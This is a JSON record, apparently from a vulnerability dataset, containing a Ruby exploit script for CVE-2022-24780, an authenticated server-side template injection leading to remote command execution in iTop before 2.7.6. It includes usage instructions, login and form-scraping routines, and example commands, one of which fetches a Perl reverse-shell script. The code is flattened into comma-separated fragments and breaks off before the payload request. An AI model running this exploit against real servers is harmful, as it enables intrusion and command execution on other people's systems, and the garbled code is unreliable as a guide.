{
    "text": "vul_name : iTop Remote Command Execution ， vul_cve : CVE-2022-24780 ， vul_poc :  #  ! /usr/bin/env ruby ，  # Exploit ， Title : iTop < 2.7.6 - ( Authenticated ) Remote command execution ， Exploit author : noraj ( Alexandre ZANNI ) for ACCEIS (  ， Author website :  ， Exploit source :  ， Date : 2022-05-20 ， Vendor Homepage :  ， Software Link :  ， Version : 2.x < 2.7.6 and 3.x.x-beta < 3.0.0 ， Tested on : iTop version 2.7.4 ( Ubuntu 18.04.4 LTS - 7.3.28 )  ，  # Vulnerability ， Discoverer : Markus KRELL ， Date : 2021-10-04 ， Discoverer website :  ， Discovered on iTop 2.7.4-7194 and 3.0.0-beta-7312 ， Title : Server-Side Template Injection inside customer Portal ， CVE : CVE-2022-24780 ， CWE : CWE-94 , CWE-1336 ， Patch :  ， require 'httpx' ， require 'docopt' ， require 'nokogiri' ， doc = ~ DOCOPT ， iTop < 2.7.6 - ( Authenticated ) Remote command execution ， Usage :  ，  # {_FILE_} full <url> <username> <password> <cmd> [ -debug ]  ，  # {_FILE_} light <url> <username> <password> <cmd> [ -debug ]  ，  # {_FILE_} -h | -help ， full : exploit with an emulated browser , execute JavaScript , preserve original user profile information ， light : just parse HTML and send requests , no JavaScript ,  ( DESTRUCTIVE ) reset user information : phone , location , function ， Options :  ， <url> Root URL ( base path ) including HTTP scheme , port and root folder ， <username> iTop portal username ， <password> iTop portal user password ， <cmd> Command to execute on the target ， -debug Display arguments ， -h , -help Show this screen ， Examples :  ，  # {_FILE_} full john 's9nvEIZnEo6ghi' 'echo proof > /var/www/html/proof.txt' ，  # {_FILE_} light john 's9nvEIZnEo6ghi' 'curl -remote-name perl revshell.pl' ， DOCOPT ， login_url = \" # {root_url}/pages/UI.php\" ， params = { ， 'auth_user' => user ,  ， 'auth_pwd' => pass ,  ， 'login_mode' => 'form' ,  ， 'loginop' => 'login' ， } ， http.post ( login_url , form : params ) .body.to_s ， end ， login_url = \" # {root_url}/pages/UI.php\" ， browser.goto login_url ， browser.text_field ( id : 'user' ) .set ( user )  ， browser.text_field ( id : 'pwd' ) .set ( pass )  ， browser.button ( value : 'Enter iTop' ) .click ， end ， profile_url = \" # {root_url}/pages/exec.php/user?exec_module=itop-portal-base&exec_page=index.php&portal_id=itop-portal\" ，  # Fetch and parse HTML document ， doc = Nokogiri.HTML5 ( http.get ( profile_url ) .body.to_s )  ， action = doc.css ( 'form' ) .first [ 'action' ]  ， transaction_id = doc.css ( 'input [ name=\"transaction_id\" ] ' ) .first [ 'value' ]  ， form_id = doc.css ( 'form' ) .first [ 'id' ]  ，  # doesn't work because it's populated with javascript , we'll need watir for that ，  # phone = doc.css ( 'input [ id^=field_phone ] ' ) .first [ 'value' ]  ，  # location = doc.css ( 'select [ id^=field_location_id ] option [ selected ] ' ) .first [ 'value' ]  ，  # function = doc.css ( 'input [ id^=field_function ] ' ) .first [ 'value' ]  ， end ， form_data = fetch_form ( root_url , http )  ， vuln_url = \" # {root_url} # {form_data [  : action ] }\"",
    "time": "2022.05.24"
}